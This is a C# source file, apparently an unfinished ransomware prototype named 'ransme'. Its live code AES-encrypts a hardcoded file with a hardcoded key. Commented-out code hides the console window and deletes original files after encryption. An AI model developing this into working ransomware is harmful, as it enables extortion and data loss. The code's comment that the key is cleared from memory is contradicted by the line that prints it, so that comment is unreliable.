using System;
using System.Runtime.InteropServices;
using System.Threading;
using System.Security.Cryptography;
using System.IO;
using System.Text;
using System.ComponentModel;



namespace ransme
{
    class Program
    {
     /*   [DllImport("kernal32.dll")]
        static extern void extern ZeroMemory("");*/

        // [DllImport("kernal32.dll")]
        //  static extern bool CreateProcessA();

        /*   
           [DllImport("kernel32.dll")]
           static extern IntPtr GetConsoleWindow();

           [DllImport("user32.dll")]
           static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

           const int SW_HIDE = 0;
           const int SW_SHOW = 5;*/
        static void Main(string[] args)
        {


            ////////////////////////////////////////////////////////////////////////////////////////////////////////
            // <الكود دا شغال برضو >

            string key = "ThePasswordToDecryptAndEncryptTheFile";

            // For additional security Pin the password of your files
            //  GCHandle gch = GCHandle.Alloc(password, GCHandleType.Pinned);

            // Encrypt the file
            //  AES2.FileEncrypt("test.txt", password);
            AES2 d = new AES2();
                d.FileEncrypt("plaintest.txt", key);
           // d.FileDecrypt("plaintest.txt.0x4D", "plaintest.txt", key);

            // To increase the security of the encryption, delete the given password from the memory !


            // You can verify it by displaying its value later on the console (the password won't appear)
            Console.WriteLine("The given password is surely nothing: " + key);


            ////////////////////////////////////////////////////////////////////////////////////////////////////////////////
            /*  byte[] key = Encoding.ASCII.GetBytes("mohamed_adel0100");
             //  AES.EncryptFile("test.txt", key);
              AES.DecryptFile("test.txt" , key);
              Console.WriteLine("==================finished=================");

                                                          "الكود دا شغال"
  */
            ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
            /*

                //  using FileStream fs = File.OpenWrite("newimg.0x4D");
                var handle = GetConsoleWindow();
            // Hide
            ShowWindow(handle, SW_SHOW);
            //Console.ReadLine();
            daata:
            UnicodeEncoding ByteConverter = new UnicodeEncoding();
            RSACryptoServiceProvider RSA = new RSACryptoServiceProvider(4096);
            byte[] plaintext;
            byte[] encryptedtext;

            plaintext = File.ReadAllBytes("test.txt");
            // plaintext =  ByteConverter.GetBytes("test.txt");
          
            encryptedtext = Encryption(plaintext, RSA.ExportParameters(false), false);

            if (encryptedtext == null)
            {
                Console.WriteLine("===================we can nt encrypt this file size ====================");
                goto daata;
            }
           // byte[] pubkey = RSA.ExportRSAPublicKey();

         *//*   foreach (var item in encryptedtext)
            {
                fs.WriteByte(item);
            }
            *//*

             File.WriteAllBytes("newtest.0x4D",encryptedtext);

           // File.Delete("test.txt");
            
           // fs.Write(encryptedtext);
            // File.rea
            Console.WriteLine(encryptedtext);

           byte[] fdata =  File.ReadAllBytes("newtest.0x4D");

            byte[] decryptedtex = Decryption(fdata, RSA.ExportParameters(true), false);
            //string ffdata = ByteConverter.GetString(decryptedtex);
            File.WriteAllBytes("test3.txt",decryptedtex);
            Console.WriteLine(decryptedtex);*/
            Thread.Sleep(50000);
           
        }



        static public byte[] Encryption(byte[] Data, RSAParameters RSAKey, bool DoOAEPPadding)
        {
            try
            {
                byte[] encryptedData;
                using (RSACryptoServiceProvider RSA = new RSACryptoServiceProvider(4096))
                {
                    RSA.ImportParameters(RSAKey);
                    encryptedData = RSA.Encrypt(Data, DoOAEPPadding);
                }
                return encryptedData;
            }
            catch (CryptographicException e)
            {
                Console.WriteLine(e.Message);
                return null;
            }
        }




        static public byte[] Decryption(byte[] Data, RSAParameters RSAKey, bool DoOAEPPadding)
        {
            try
            {
                byte[] decryptedData;
                using (RSACryptoServiceProvider RSA = new RSACryptoServiceProvider())
                {
                    RSA.ImportParameters(RSAKey);
                    decryptedData = RSA.Decrypt(Data, DoOAEPPadding);
                }
                
                return decryptedData;
            }
            catch (CryptographicException e)
            {
                Console.WriteLine(e.ToString());
                return null;
            }
        }
    }
}
